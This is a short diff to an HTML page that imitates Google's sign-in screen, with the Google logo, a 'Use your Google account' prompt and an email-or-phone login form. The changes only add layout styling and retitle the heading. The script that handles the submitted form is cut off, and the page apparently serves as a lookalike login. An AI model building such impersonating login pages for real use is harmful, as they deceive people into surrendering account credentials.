@@ -9,11 +9,25 @@
         body {
             font-family: 'Product Sans', sans-serif;
         }
+        .Items {
+            text-align: left;
+            align-items: center;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            width: 700px;
+            margin: auto;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
     </style>
 </head>
 <body>
     <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcdn1.iconfinder.com%2Fdata%2Ficons%2Flogos-brands-in-colors%2F544%2FGoogle__G__Logo-1024.png&f=1&nofb=1&ipt=7517707b4fd748ec5deba9ecab5ecebdf4e5023138f8f0bbd32792102747a4e6" width="60" height="60">
-    <h1>Sign In</h1><br>
+    <div class="Items">
+    <h1>Log In</h1><br>
     <p>Use your Google account</p>
     <form id="loginForm">
         <input type="email" placeholder="Email or Phone" id="email" required><br>
@@ -22,6 +36,7 @@
         <button type="submit">Login</button><br>
         <a href="">Forgot email?</a>
     </form>
+    </div>
     <script>
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault();
